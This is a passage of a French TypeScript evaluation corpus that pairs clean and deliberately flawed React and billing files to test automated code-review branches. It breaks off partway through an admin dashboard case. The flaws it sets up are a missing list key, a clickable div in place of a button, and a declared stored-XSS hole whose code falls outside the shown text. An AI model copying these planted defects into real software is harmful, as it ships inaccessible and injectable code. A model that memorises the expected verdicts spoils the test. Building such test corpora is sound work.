// J2 — CORPUS « FICHIERS LONGS », le chaînon manquant de la mesure J0.
//
// Pourquoi ce fichier existe (2026-08-05). J0 a mesuré 0 faux positif sur 45 verdicts.
// La PREMIÈRE rencontre avec du vrai code en a produit un immédiatement : sur
// `abyss/src/components/Catalogue.jsx` (334 lignes), la branche Performance a exigé
// « ajouter une clé unique à chaque élément de filtered.map » alors que `key={c.id}`
// était présent ligne 308 — et le fichier était INTÉGRALEMENT dans le prompt. Le modèle
// avait l'information sous les yeux et a affirmé le contraire (cf. J1-DETACHER.md,
// défaut n°1).
//
// Le score J0 n'était donc pas faux : il ne mesurait simplement pas ce qu'on croyait.
// Il mesure la capacité à juger un défaut ISOLÉ, dans un fichier de 12 à 40 lignes.
// Le code réel est plus long, plus bruyant, et contient des dizaines de constructions
// voisines du défaut cherché. C'est un tout autre exercice — celui-ci.
//
// PRINCIPE DE CONSTRUCTION, en plus de celui de corpus.ts :
//   • chaque cas fautif a un JUMEAU PROPRE de longueur et de forme comparables ;
//     sans ce jumeau, on ne distingue pas « détecte » de « crie au loup sur du long » ;
//   • le défaut est ENFOUI (dernier tiers du fichier), jamais en tête — c'est ce qui
//     l'oppose au corpus J0, où il tombait sous les yeux du modèle en premier ;
//   • le fichier propre contient DÉLIBÉRÉMENT des constructions qui ressemblent au
//     défaut (des `.map()` en série, du HTML injecté mais assaini, des dépendances
//     d'effets non triviales) : c'est là que naissent les hallucinations.
//
// Module séparé pour une raison bête mais réelle : ces cas pèsent plusieurs milliers de
// caractères chacun. Les mettre dans corpus.ts rendrait les 23 cas courts illisibles.
import type { EvalCase } from './corpus.js'

// ─────────────────────────────────────────────────────────────────────────────
// Page de paramètres — partagée par LONG-08 (propre) et LONG-09 (div cliquable).
//
// Même technique que la paire Catalogue : UN seul corps, UNE seule ligne de
// différence. C'est la construction la plus sévère du corpus — le modèle ne peut
// pas distinguer les deux cas autrement qu'en jugeant la ligne en cause.
//
// Le voisinage est délibérément IRRÉPROCHABLE côté accessibilité : chaque champ a
// son <label htmlFor>, les groupes ont fieldset/legend, l'avatar a un alt utile, la
// confirmation passe par une région aria-live, la hiérarchie de titres est plate, et
// toutes les autres commandes sont de vrais <button>. Une branche qui réagirait au
// mot-clé « formulaire » plutôt qu'au code crierait au loup ici.
// ─────────────────────────────────────────────────────────────────────────────

const PARAMETRES_TETE = `import { useEffect, useMemo, useState } from 'react'
import CarteAppareil from './CarteAppareil.jsx'
import { chargerCompte, enregistrerCompte, revoquerSession } from '../lib/compte.js'

const FUSEAUX = ['Europe/Paris', 'Europe/Lisbon', 'America/Montreal', 'Asia/Tokyo']
const FREQUENCES = [
  { id: 'immediate', libelle: 'À chaque événement' },
  { id: 'quotidienne', libelle: 'Résumé quotidien' },
  { id: 'hebdomadaire', libelle: 'Résumé hebdomadaire' },
  { id: 'aucune', libelle: 'Aucune notification' },
]
const CANAUX = ['courriel', 'push', 'sms']

function estCourrielValide(valeur) {
  return /^[^@\\s]+@[^@\\s]+\\.[^@\\s]+$/.test(valeur.trim())
}

export default function ParametresCompte({ utilisateur }) {
  const [nom, setNom] = useState(utilisateur?.nom ?? '')
  const [courriel, setCourriel] = useState(utilisateur?.courriel ?? '')
  const [fuseau, setFuseau] = useState(utilisateur?.fuseau ?? 'Europe/Paris')
  const [frequence, setFrequence] = useState('quotidienne')
  const [canaux, setCanaux] = useState(['courriel'])
  const [sessions, setSessions] = useState([])
  const [chargement, setChargement] = useState(true)
  const [statut, setStatut] = useState(null)
  const [erreur, setErreur] = useState(null)

  useEffect(() => {
    let annule = false
    chargerCompte()
      .then((donnees) => {
        if (annule) return
        setSessions(donnees.sessions ?? [])
        setCanaux(donnees.canaux ?? ['courriel'])
      })
      .catch((err) => {
        if (!annule) setErreur(err.message ?? 'Chargement impossible')
      })
      .finally(() => {
        if (!annule) setChargement(false)
      })
    return () => {
      annule = true
    }
  }, [])

  const courrielValide = useMemo(() => estCourrielValide(courriel), [courriel])
  const modifiable = !chargement && nom.trim().length > 0 && courrielValide

  function basculerCanal(canal) {
    setCanaux((precedent) =>
      precedent.includes(canal) ? precedent.filter((c) => c !== canal) : [...precedent, canal],
    )
  }

  async function surEnregistrer(evenement) {
    evenement.preventDefault()
    setStatut(null)
    setErreur(null)
    try {
      await enregistrerCompte({ nom, courriel, fuseau, frequence, canaux })
      setStatut('Vos préférences ont été enregistrées.')
    } catch (err) {
      setErreur(err.message ?? 'Enregistrement impossible')
    }
  }

  async function surRevoquer(identifiant) {
    try {
      await revoquerSession(identifiant)
      setSessions((liste) => liste.filter((s) => s.id !== identifiant))
      setStatut('La session a été révoquée.')
    } catch (err) {
      setErreur(err.message ?? 'Révocation impossible')
    }
  }

  if (chargement) {
    return (
      <p role="status" aria-live="polite">
        Chargement de vos paramètres…
      </p>
    )
  }

  return (
    <main className="parametres" aria-labelledby="titre-parametres">
      <h1 id="titre-parametres">Paramètres du compte</h1>

      {/* Les messages de succès et d'erreur sont annoncés aux lecteurs d'écran. */}
      <p role="status" aria-live="polite" className="parametres__statut">
        {statut}
      </p>
      {erreur && (
        <p role="alert" className="parametres__erreur">
          {erreur}
        </p>
      )}

      <img
        src={utilisateur.avatar}
        alt={\`Photo de profil de \${utilisateur.nom}\`}
        width="96"
        height="96"
      />

      <form onSubmit={surEnregistrer}>
        <h2>Identité</h2>

        <label htmlFor="champ-nom">Nom affiché</label>
        <input
          id="champ-nom"
          type="text"
          value={nom}
          autoComplete="name"
          onChange={(e) => setNom(e.target.value)}
        />

        <label htmlFor="champ-courriel">Adresse de courriel</label>
        <input
          id="champ-courriel"
          type="email"
          value={courriel}
          autoComplete="email"
          aria-invalid={!courrielValide}
          aria-describedby="aide-courriel"
          onChange={(e) => setCourriel(e.target.value)}
        />
        <p id="aide-courriel">Sert à la connexion et aux notifications importantes.</p>

        <label htmlFor="champ-fuseau">Fuseau horaire</label>
        <select id="champ-fuseau" value={fuseau} onChange={(e) => setFuseau(e.target.value)}>
          {FUSEAUX.map((f) => (
            <option key={f} value={f}>
              {f}
            </option>
          ))}
        </select>

        <h2>Notifications</h2>

        <fieldset>
          <legend>Fréquence des résumés</legend>
          {FREQUENCES.map((f) => (
            <label key={f.id} htmlFor={\`freq-\${f.id}\`}>
              <input
                id={\`freq-\${f.id}\`}
                type="radio"
                name="frequence"
                value={f.id}
                checked={frequence === f.id}
                onChange={() => setFrequence(f.id)}
              />
              {f.libelle}
            </label>
          ))}
        </fieldset>

        <fieldset>
          <legend>Canaux de réception</legend>
          {CANAUX.map((canal) => (
            <label key={canal} htmlFor={\`canal-\${canal}\`}>
              <input
                id={\`canal-\${canal}\`}
                type="checkbox"
                checked={canaux.includes(canal)}
                onChange={() => basculerCanal(canal)}
              />
              {canal}
            </label>
          ))}
        </fieldset>

        <button type="submit" disabled={!modifiable}>
          Enregistrer les modifications
        </button>
        <button type="button" onClick={() => window.history.back()}>
          Annuler
        </button>
      </form>
`

const PARAMETRES_PIED = `
      <footer className="parametres__pied">
        <p>Besoin d'aide ? Écrivez à support@example.com.</p>
      </footer>
    </main>
  )
}
`

/** La commande « Révoquer » — SEULE différence entre le cas propre et le cas fautif.
 *  Enfouie dans le dernier tiers, au milieu d'une section par ailleurs conforme. */
const sectionSessions = (bouton: boolean): string => `
      <section aria-labelledby="titre-sessions">
        <h2 id="titre-sessions">Sessions actives</h2>
        <p>Voici les appareils actuellement connectés à votre compte.</p>

        <ul className="parametres__sessions">
          {sessions.map((session) => (
            <li key={session.id} className="parametres__session">
              <CarteAppareil appareil={session.appareil} lieu={session.lieu} vueLe={session.vueLe} />
              ${
                bouton
                  ? `<button
                type="button"
                onClick={() => surRevoquer(session.id)}
                aria-label={\`Révoquer la session sur \${session.appareil}\`}
              >
                Révoquer
              </button>`
                  : `<div
                className="parametres__revoquer"
                onClick={() => surRevoquer(session.id)}
              >
                Révoquer
              </div>`
              }
            </li>
          ))}
        </ul>
      </section>
`

const CARTE_APPAREIL = `export default function CarteAppareil({ appareil, lieu, vueLe }) {
  return (
    <article className="carte-appareil">
      <h3>{appareil}</h3>
      <dl>
        <dt>Lieu</dt>
        <dd>{lieu}</dd>
        <dt>Dernière activité</dt>
        <dd>
          <time dateTime={vueLe}>{new Date(vueLe).toLocaleString('fr-FR')}</time>
        </dd>
      </dl>
    </article>
  )
}
`

// ─────────────────────────────────────────────────────────────────────────────
// Logique de facturation — partagée par LONG-05 (non testée) et LONG-06 (testée).
// Non triviale À DESSEIN : paliers de remise, proratisation, TVA par pays, arrondis.
// C'est exactement le genre de code dont l'absence de test est un vrai défaut, et
// pas une exigence de forme.
// ─────────────────────────────────────────────────────────────────────────────

const FACTURATION = `// Calcul de facturation — paliers, prorata, TVA. Tout en centimes entiers :
// les flottants sur de la monnaie produisent des écarts d'un centime qui finissent
// en litige client.
const PALIERS_REMISE = [
  { minCents: 500_00, remise: 0.15 },
  { minCents: 200_00, remise: 0.1 },
  { minCents: 100_00, remise: 0.05 },
]

const TVA_PAR_PAYS = { FR: 0.2, BE: 0.21, LU: 0.17, DE: 0.19, ES: 0.21 }
const TVA_DEFAUT = 0.2
const JOURS_MOIS_REFERENCE = 30

export class ErreurFacturation extends Error {
  constructor(message, code) {
    super(message)
    this.name = 'ErreurFacturation'
    this.code = code
  }
}

/** Remise applicable au sous-total, en fraction (0.15 = 15 %). Paliers NON cumulables. */
export function tauxRemise(sousTotalCents, codePromo) {
  let taux = 0
  for (const palier of PALIERS_REMISE) {
    if (sousTotalCents >= palier.minCents) {
      taux = palier.remise
      break
    }
  }
  // Un code promo s'ajoute au palier, mais l'ensemble est plafonné : sans ce plafond,
  // un cumul palier + promo pouvait dépasser 100 % et produire un total négatif.
  if (codePromo && codePromo.actif) taux += codePromo.remise
  return Math.min(taux, 0.5)
}

/** Part d'un mois réellement consommée, sur une base de 30 jours. */
export function prorata(jourDebut, jourFin) {
  if (jourFin < jourDebut) throw new ErreurFacturation('Période inversée', 'PERIODE_INVALIDE')
  const jours = Math.min(jourFin - jourDebut + 1, JOURS_MOIS_REFERENCE)
  return jours / JOURS_MOIS_REFERENCE
}

export function tauxTva(pays) {
  return TVA_PAR_PAYS[pays] ?? TVA_DEFAUT
}

/** Arrondi commercial au centime, moitié vers le haut. Math.round() suffit sur des
 *  centimes entiers, mais l'intention est explicite pour qui relit. */
function arrondiCentimes(valeur) {
  return Math.round(valeur)
}

export function calculerLigne(ligne) {
  if (!Number.isInteger(ligne.prixUnitaireCents) || ligne.prixUnitaireCents < 0) {
    throw new ErreurFacturation(\`Prix invalide sur \${ligne.sku}\`, 'PRIX_INVALIDE')
  }
  if (!Number.isInteger(ligne.quantite) || ligne.quantite <= 0) {
    throw new ErreurFacturation(\`Quantité invalide sur \${ligne.sku}\`, 'QUANTITE_INVALIDE')
  }
  const brut = ligne.prixUnitaireCents * ligne.quantite
  const part = ligne.prorata ? prorata(ligne.prorata.debut, ligne.prorata.fin) : 1
  return { sku: ligne.sku, brutCents: arrondiCentimes(brut * part) }
}

export function calculerFacture(commande) {
  if (!commande || !Array.isArray(commande.lignes) || commande.lignes.length === 0) {
    throw new ErreurFacturation('Commande sans ligne', 'COMMANDE_VIDE')
  }

  const lignes = commande.lignes.map(calculerLigne)
  const sousTotalCents = lignes.reduce((s, l) => s + l.brutCents, 0)

  const taux = tauxRemise(sousTotalCents, commande.codePromo)
  const remiseCents = arrondiCentimes(sousTotalCents * taux)
  const apresRemiseCents = sousTotalCents - remiseCents

  const tva = tauxTva(commande.paysLivraison)
  const tvaCents = arrondiCentimes(apresRemiseCents * tva)

  // Les frais de port sont offerts au-delà du 2ᵉ palier, et jamais taxés deux fois :
  // ils entrent APRÈS le calcul de TVA parce qu'ils la portent déjà.
  const portCents = sousTotalCents >= PALIERS_REMISE[1].minCents ? 0 : (commande.portCents ?? 0)

  return {
    lignes,
    sousTotalCents,
    tauxRemise: taux,
    remiseCents,
    tauxTva: tva,
    tvaCents,
    portCents,
    totalCents: apresRemiseCents + tvaCents + portCents,
  }
}

/** Répartit un avoir sur les lignes, au prorata de leur poids. Le dernier centime va
 *  à la plus grosse ligne — sinon la somme des parts ne retombe pas sur le total. */
export function repartirAvoir(facture, avoirCents) {
  if (avoirCents <= 0) throw new ErreurFacturation('Avoir non positif', 'AVOIR_INVALIDE')
  if (avoirCents > facture.totalCents) throw new ErreurFacturation('Avoir supérieur au total', 'AVOIR_TROP_GRAND')

  const parts = facture.lignes.map((l) => ({
    sku: l.sku,
    partCents: Math.floor((l.brutCents / facture.sousTotalCents) * avoirCents),
  }))
  const reste = avoirCents - parts.reduce((s, p) => s + p.partCents, 0)
  if (reste > 0) {
    const plusGrosse = parts.reduce((a, b) => (b.partCents > a.partCents ? b : a), parts[0])
    plusGrosse.partCents += reste
  }
  return parts
}
`

const FACTURATION_TESTS = `import { describe, it, expect } from 'vitest'
import { calculerFacture, tauxRemise, prorata, repartirAvoir, ErreurFacturation } from './facturation.js'

const ligne = (sku, prixUnitaireCents, quantite) => ({ sku, prixUnitaireCents, quantite })

describe('tauxRemise — paliers non cumulables', () => {
  it('sous le premier palier : aucune remise', () => {
    expect(tauxRemise(50_00)).toBe(0)
  })

  it('applique le palier atteint, et un seul', () => {
    expect(tauxRemise(150_00)).toBe(0.05)
    expect(tauxRemise(250_00)).toBe(0.1)
    expect(tauxRemise(600_00)).toBe(0.15)
  })

  it('cumule un code promo actif, mais plafonne à 50 %', () => {
    expect(tauxRemise(600_00, { actif: true, remise: 0.2 })).toBeCloseTo(0.35)
    expect(tauxRemise(600_00, { actif: true, remise: 0.9 })).toBe(0.5)
  })

  it('ignore un code promo inactif', () => {
    expect(tauxRemise(600_00, { actif: false, remise: 0.2 })).toBe(0.15)
  })
})

describe('prorata', () => {
  it('mois complet = 1', () => {
    expect(prorata(1, 30)).toBe(1)
  })

  it('borne à 30 jours même sur un mois de 31', () => {
    expect(prorata(1, 31)).toBe(1)
  })

  it('période inversée : lève', () => {
    expect(() => prorata(20, 5)).toThrow(ErreurFacturation)
  })
})

describe('calculerFacture', () => {
  it('total = sous-total - remise + TVA + port', () => {
    const f = calculerFacture({ lignes: [ligne('A', 100_00, 1)], paysLivraison: 'FR', portCents: 5_00 })
    expect(f.sousTotalCents).toBe(100_00)
    expect(f.remiseCents).toBe(5_00)
    expect(f.tvaCents).toBe(19_00)
    expect(f.totalCents).toBe(100_00 - 5_00 + 19_00 + 5_00)
  })

  it('port offert au-delà du 2ᵉ palier', () => {
    const f = calculerFacture({ lignes: [ligne('A', 300_00, 1)], paysLivraison: 'FR', portCents: 5_00 })
    expect(f.portCents).toBe(0)
  })

  it('TVA par pays, défaut 20 % sur pays inconnu', () => {
    expect(calculerFacture({ lignes: [ligne('A', 10_00, 1)], paysLivraison: 'BE' }).tauxTva).toBe(0.21)
    expect(calculerFacture({ lignes: [ligne('A', 10_00, 1)], paysLivraison: 'XX' }).tauxTva).toBe(0.2)
  })

  it('refuse une commande vide et une quantité nulle', () => {
    expect(() => calculerFacture({ lignes: [] })).toThrow(ErreurFacturation)
    expect(() => calculerFacture({ lignes: [ligne('A', 10_00, 0)] })).toThrow(ErreurFacturation)
  })
})

describe('repartirAvoir — la somme des parts retombe TOUJOURS sur le montant demandé', () => {
  it('répartit au prorata et place le centime résiduel sur la plus grosse ligne', () => {
    const f = calculerFacture({ lignes: [ligne('A', 33_33, 1), ligne('B', 66_67, 1)], paysLivraison: 'FR' })
    const parts = repartirAvoir(f, 10_01)
    expect(parts.reduce((s, p) => s + p.partCents, 0)).toBe(10_01)
  })

  it('refuse un avoir supérieur au total', () => {
    const f = calculerFacture({ lignes: [ligne('A', 10_00, 1)], paysLivraison: 'FR' })
    expect(() => repartirAvoir(f, 999_00)).toThrow(ErreurFacturation)
  })
})
`

// ─────────────────────────────────────────────────────────────────────────────
// Fragments partagés — le « bruit » réaliste qui entoure le défaut.
// Les deux Catalogue (propre et fautif) partagent TOUT sauf la ligne qui compte :
// c'est ce qui fait de la paire une vraie mesure de discrimination.
// ─────────────────────────────────────────────────────────────────────────────

const CATALOGUE_TETE = `import { useEffect, useMemo, useState, useCallback } from 'react'
import CreatureCard from './CreatureCard.jsx'
import FiltrePanneau from './FiltrePanneau.jsx'
import { chargerCreatures } from '../lib/api.js'
import { formatPrix } from '../utils/prix.js'

const RARETES = ['commune', 'rare', 'epique', 'legendaire']
const TRIS = [
  { id: 'nom', libelle: 'Nom (A→Z)' },
  { id: 'prix-asc', libelle: 'Prix croissant' },
  { id: 'prix-desc', libelle: 'Prix décroissant' },
  { id: 'puissance', libelle: 'Puissance' },
]
const PAR_PAGE = 24

function comparer(tri) {
  switch (tri) {
    case 'prix-asc':
      return (a, b) => a.prixCents - b.prixCents
    case 'prix-desc':
      return (a, b) => b.prixCents - a.prixCents
    case 'puissance':
      return (a, b) => b.puissance - a.puissance
    default:
      return (a, b) => a.nom.localeCompare(b.nom, 'fr')
  }
}

export default function Catalogue({ utilisateur, onAjouterPanier }) {
  const [creatures, setCreatures] = useState([])
  const [chargement, setChargement] = useState(true)
  const [erreur, setErreur] = useState(null)
  const [recherche, setRecherche] = useState('')
  const [raretes, setRaretes] = useState([])
  const [tri, setTri] = useState('nom')
  const [page, setPage] = useState(0)
  const [favoris, setFavoris] = useState(() => new Set())

  useEffect(() => {
    let annule = false
    setChargement(true)
    chargerCreatures()
      .then((donnees) => {
        if (annule) return
        setCreatures(donnees)
        setErreur(null)
      })
      .catch((err) => {
        if (annule) return
        setErreur(err.message ?? 'Chargement impossible')
      })
      .finally(() => {
        if (!annule) setChargement(false)
      })
    return () => {
      annule = true
    }
  }, [])

  // Remise à zéro de la pagination dès qu'un critère change : sans ça, un filtre
  // restrictif laisse l'utilisateur sur une page vide sans explication.
  useEffect(() => {
    setPage(0)
  }, [recherche, raretes, tri])

  const filtrees = useMemo(() => {
    const terme = recherche.trim().toLowerCase()
    return creatures
      .filter((c) => (terme ? c.nom.toLowerCase().includes(terme) : true))
      .filter((c) => (raretes.length ? raretes.includes(c.rarete) : true))
      .sort(comparer(tri))
  }, [creatures, recherche, raretes, tri])

  const pageCourante = useMemo(
    () => filtrees.slice(page * PAR_PAGE, page * PAR_PAGE + PAR_PAGE),
    [filtrees, page],
  )
  const nbPages = Math.max(1, Math.ceil(filtrees.length / PAR_PAGE))

  const basculerFavori = useCallback((id) => {
    setFavoris((precedent) => {
      const suivant = new Set(precedent)
      if (suivant.has(id)) suivant.delete(id)
      else suivant.add(id)
      return suivant
    })
  }, [])

  const basculerRarete = useCallback((rarete) => {
    setRaretes((precedent) =>
      precedent.includes(rarete) ? precedent.filter((r) => r !== rarete) : [...precedent, rarete],
    )
  }, [])

  const valeurTotale = useMemo(
    () => filtrees.reduce((somme, c) => somme + c.prixCents, 0),
    [filtrees],
  )

  if (chargement) {
    return (
      <div className="catalogue catalogue--chargement" role="status" aria-live="polite">
        <p>Chargement du catalogue…</p>
      </div>
    )
  }

  if (erreur) {
    return (
      <div className="catalogue catalogue--erreur" role="alert">
        <p>Le catalogue n'a pas pu être chargé : {erreur}</p>
        <button type="button" onClick={() => window.location.reload()}>
          Réessayer
        </button>
      </div>
    )
  }

  return (
    <section className="catalogue" aria-labelledby="titre-catalogue">
      <header className="catalogue__entete">
        <h1 id="titre-catalogue">Catalogue des créatures</h1>
        <p>
          {filtrees.length} créature(s) — valeur totale {formatPrix(valeurTotale)}
        </p>
      </header>

      <FiltrePanneau>
        <label htmlFor="recherche-creature">Rechercher une créature</label>
        <input
          id="recherche-creature"
          type="search"
          value={recherche}
          placeholder="Nom de la créature"
          onChange={(e) => setRecherche(e.target.value)}
        />

        <fieldset>
          <legend>Rareté</legend>
          {RARETES.map((rarete) => (
            <label key={rarete} htmlFor={\`rarete-\${rarete}\`} className="catalogue__case">
              <input
                id={\`rarete-\${rarete}\`}
                type="checkbox"
                checked={raretes.includes(rarete)}
                onChange={() => basculerRarete(rarete)}
              />
              {rarete}
            </label>
          ))}
        </fieldset>

        <label htmlFor="tri-catalogue">Trier par</label>
        <select id="tri-catalogue" value={tri} onChange={(e) => setTri(e.target.value)}>
          {TRIS.map((option) => (
            <option key={option.id} value={option.id}>
              {option.libelle}
            </option>
          ))}
        </select>
      </FiltrePanneau>
`

const CATALOGUE_PIED = `
      <nav className="catalogue__pagination" aria-label="Pagination du catalogue">
        <button type="button" disabled={page === 0} onClick={() => setPage((p) => p - 1)}>
          Page précédente
        </button>
        <span>
          Page {page + 1} sur {nbPages}
        </span>
        <button
          type="button"
          disabled={page >= nbPages - 1}
          onClick={() => setPage((p) => p + 1)}
        >
          Page suivante
        </button>
      </nav>
    </section>
  )
}
`

/** La grille — SEULE différence entre le cas propre et le cas fautif.
 *
 *  (2026-08-08, lot 6 — faille L6-d) Le `<h2>` a été AJOUTÉ ici. Sans lui, les cartes en
 *  `<h3>` suivaient directement le `<h1>` du catalogue, sans niveau intermédiaire pour la
 *  grille de résultats — le seul `<h2>` du fichier étant dans l'`aside` des favoris.
 *
 *  C'est la branche accessibilité qui l'a relevé, sur `LONG-01`, aux deux passes de la
 *  mesure du 2026-08-08. Le harnais l'a compté en FAUX POSITIF parce que le cas déclare
 *  `accessibility: 'pass'` — mais **le fait était exact**, vérifié à la main. Ce n'était
 *  pas une hallucination : c'était un vrai défaut d'accessibilité dans un fichier que le
 *  corpus présentait comme propre.
 *
 *  Deux issues étaient possibles : retirer l'assertion (le cas a été écrit comme contrôle
 *  des CLÉS DE LISTE, pas de l'accessibilité), ou réparer la fixture. **La seconde est la
 *  bonne** — un contrôle « propre » qui contient un vrai défaut n'est pas un contrôle, et
 *  toute branche notée dessus produira des faux positifs légitimes. Retirer l'assertion
 *  aurait fait disparaître le symptôme en gardant la cause.
 *
 *  ⚠️ Le chiffre publié le 2026-08-08 (accessibility 2/8) reste celui mesuré contre le
 *  corpus AVANT cette réparation. On ne réécrit pas une mesure passée ; on date la
 *  correction et on re-mesure. */
const grille = (avecCle: boolean): string => `
      <h2 id="titre-resultats">Résultats</h2>
      <div className="catalogue__grille">
        {pageCourante.map((c) => (
          <CreatureCard
            ${avecCle ? 'key={c.id}\n            ' : ''}creature={c}
            estFavori={favoris.has(c.id)}
            surFavori={() => basculerFavori(c.id)}
            surAjout={() => onAjouterPanier(c, utilisateur)}
          />
        ))}
      </div>

      {favoris.size > 0 && (
        <aside className="catalogue__favoris" aria-labelledby="titre-favoris">
          <h2 id="titre-favoris">Vos favoris</h2>
          <ul>
            {creatures
              .filter((c) => favoris.has(c.id))
              .map((c) => (
                <li key={\`fav-\${c.id}\`}>
                  <img src={c.vignette} alt={\`Vignette de \${c.nom}\`} width="48" height="48" />
                  <span>{c.nom}</span>
                  <span>{formatPrix(c.prixCents)}</span>
                </li>
              ))}
          </ul>
        </aside>
      )}
`

const CREATURE_CARD = `export default function CreatureCard({ creature, estFavori, surFavori, surAjout }) {
  return (
    <article className="creature-card">
      <img
        src={creature.illustration}
        alt={\`Illustration de \${creature.nom}, créature \${creature.rarete}\`}
        width="320"
        height="200"
        loading="lazy"
      />
      <h3>{creature.nom}</h3>
      <dl>
        <dt>Rareté</dt>
        <dd>{creature.rarete}</dd>
        <dt>Puissance</dt>
        <dd>{creature.puissance}</dd>
      </dl>
      <button type="button" aria-pressed={estFavori} onClick={surFavori}>
        {estFavori ? 'Retirer des favoris' : 'Ajouter aux favoris'}
      </button>
      <button type="button" onClick={surAjout}>
        Ajouter au panier
      </button>
    </article>
  )
}
`

// ─────────────────────────────────────────────────────────────────────────────
// 📏 FICHIERS LONGS — 4 cas (2 fautifs, 2 propres, appariés)
// ─────────────────────────────────────────────────────────────────────────────

export const LONG: EvalCase[] = [
  {
    // Le cas qui REJOUE le faux positif du 2026-08-04. Si la branche Performance
    // répond "fail" ici, c'est l'hallucination de J1 reproduite à l'identique.
    id: 'LONG-01-catalogue-propre',
    defect:
      "RIEN côté clés de liste — catalogue React de 210 lignes, TOUTES les listes ont une clé " +
      "stable (reproduction du faux positif J1 : `key={c.id}` était présent, la branche a exigé " +
      "de l'ajouter).",
    location: 'src/components/Catalogue.jsx — 4 .map(), 4 clés',
    rule: 'React — clés de liste (contrôle négatif)',
    // (2026-08-05, après la 1ʳᵉ mesure) `architecture: 'pass'` a été RETIRÉ d'ici.
    //
    // La branche architecture a répondu "fail" : « composant monolithe de plus de 300 lignes ».
    // Deux choses distinctes s'y mêlent, et il faut les séparer avant de compter un point :
    //   • sur le FOND, elle n'a pas tort — 210 lignes qui mêlent fetch, filtres, tri,
    //     pagination, favoris et rendu, c'est très exactement le cas ARCH-01 du corpus
    //     principal. Affirmer `pass` était un excès de MA part : ce cas a été construit
    //     comme un contrôle de CLÉS DE LISTE, pas comme un contrôle d'architecture ;
    //   • sur la FORME, sa justification est fausse : le fichier fait 210 lignes, pas 300.
    //     Cette inexactitude est consignée dans J2-COUVERTURE.md — elle relève de la même
    //     famille que le défaut n°1 de J1 (affirmer un fait que le texte fourni contredit),
    //     et elle reste à surveiller même si elle n'est plus notée ici.
    //
    // Règle appliquée, celle du corpus lui-même : « on ne note que ce qu'on est sûr
    // d'affirmer ». Une branche absente n'est ni détection ni faux positif. Retirer une
    // assertion mal fondée n'est pas blanchir un score — la garder l'aurait été.
    // Le contrôle « long fichier architecturalement propre » existe déjà : c'est LONG-04.
    expect: { performance: 'pass', accessibility: 'pass', security: 'pass' },
    testsElsewhereInProject: true,
    files: [
      { path: 'src/components/Catalogue.jsx', content: CATALOGUE_TETE + grille(true) + CATALOGUE_PIED },
      { path: 'src/components/CreatureCard.jsx', content: CREATURE_CARD },
    ],
  },
  {
    // Le jumeau fautif : MÊME fichier, la clé en moins sur la grille principale.
    // Les 3 autres .map() gardent la leur — le modèle doit trouver LA bonne.
    id: 'LONG-02-catalogue-cle-manquante',
    defect: 'Clé absente sur la grille principale (les 3 autres listes du fichier ont la leur).',
    location: 'src/components/Catalogue.jsx — pageCourante.map, dernier tiers du fichier',
    rule: 'React — clés de liste',
    expect: { performance: 'fail' },
    testsElsewhereInProject: true,
    files: [
      { path: 'src/components/Catalogue.jsx', content: CATALOGUE_TETE + grille(false) + CATALOGUE_PIED },
      { path: 'src/components/CreatureCard.jsx', content: CREATURE_CARD },
    ],
  },
  {
    id: 'LONG-03-admin-xss-enfoui',
    defect:
      'XSS stocké : le commentaire d\'un client est injecté en innerHTML sans assainissement, ' +
      'au milieu d\'un tableau de bord de ~250 lignes par ailleurs correct.',
    location: 'src/pages/AdminCommandes.jsx — rendreNoteClient(), dernier tiers',
    rule: 'OWASP A03 — Injection (XSS stocké)',
    expect: { security: 'fail' },
    testsElsewhereInProject: true,
    files: [
      {
        path: 'src/pages/AdminCommandes.jsx',
        content: `import { useEffect, useMemo, useRef, useState } from 'react'
import { escapeHtml } from '../utils/html.js'
import { formatPrix } from '../utils/prix.js'
import { chargerCommandes, changerStatut } from '../lib/api.js'

const STATUTS = ['en-attente', 'payee', 'expediee', 'livree', 'annulee']
const LIBELLES = {
  'en-attente': 'En attente',
  payee: 'Payée',
  expediee: 'Expédiée',
  livree: 'Livrée',
  annulee: 'Annulée',
}

function resumeParStatut(commandes) {
  const resume = {}
  for (const statut of STATUTS) resume[statut] = { nombre: 0, totalCents: 0 }
  for (const commande of commandes) {
    const ligne = resume[commande.statut]
    if (!ligne) continue
    ligne.nombre += 1
    ligne.totalCents += commande.totalCents
  }
  return resume
}

export default function AdminCommandes({ operateur }) {
  const [commandes, setCommandes] = useState([])
  const [statutFiltre, setStatutFiltre] = useState('toutes')
  const [recherche, setRecherche] = useState('')
  const [selection, setSelection] = useState(null)
  const [chargement, setChargement] = useState(true)
  const [erreur, setErreur] = useState(null)

  useEffect(() => {
    let annule = false
    chargerCommandes()
      .then((donnees) => {
        if (!annule) setCommandes(donnees)
      })
      .catch((err) => {
        if (!annule) setErreur(err.message ?? 'Chargement impossible')
      })
      .finally(() => {
        if (!annule) setChargement(false)
      })
    return () => {
      annule = true
    }
  }, [])

  const visibles = useMemo(() => {
    const terme = recherche.trim().toLowerCase()
    return commandes
      .filter((c) => (statutFiltre === 'toutes' ? true : c.statut === statutFiltre))
      .filter((c) =>
        terme ? c.reference.toLowerCase().includes(terme) || c.client.nom.toLowerCase().includes(terme) : true,
      )
      .sort((a, b) => new Date(b.creeeLe) - new Date(a.creeeLe))
  }, [commandes, statutFiltre, recherche])

  const resume = useMemo(() => resumeParStatut(commandes), [commandes])

  async function surChangementStatut(reference, statut) {
    const precedent = commandes
    setCommandes((liste) => liste.map((c) => (c.reference === reference ? { ...c, statut } : c)))
    try {
      await changerStatut(reference, statut, operateur.id)
    } catch (err) {
      // Retour à l'état antérieur : un tableau de bord qui ment sur le statut d'une
      // commande est pire qu'un tableau de bord qui affiche une erreur.
      setCommandes(precedent)
      setErreur(\`Statut non enregistré : \${err.message ?? 'erreur inconnue'}\`)
    }
  }

  if (chargement) {
    return (
      <p role="status" aria-live="polite">
        Chargement des commandes…
      </p>
    )
  }

  return (
    <section className="admin-commandes" aria-labelledby="titre-admin">
      <h1 id="titre-admin">Commandes</h1>

      {erreur && (
        <p role="alert" className="admin-commandes__erreur">
          {erreur}
        </p>
      )}

      <div className="admin-commandes__resume">
        {STATUTS.map((statut) => (
          <article key={statut} className="admin-commandes__tuile">
            <h2>{LIBELLES[statut]}</h2>
            <p>{resume[statut].nombre} commande(s)</p>
            <p>{formatPrix(resume[statut].totalCents)}</p>
          </article>
        ))}
      </div>

      <div className="admin-commandes__filtres">
        <label htmlFor="recherche-commande">Rechercher (référence ou client)</label>
        <input
          id="recherche-commande"
          type="search"
          value={recherche}
          onChange={(e) => setRecherche(e.target.value)}
        />

        <label htmlFor="filtre-statut">Statut</label>
        <select id="filtre-statut" value={statutFiltre} onChange={(e) => setStatutFiltre(e.target.value)}>
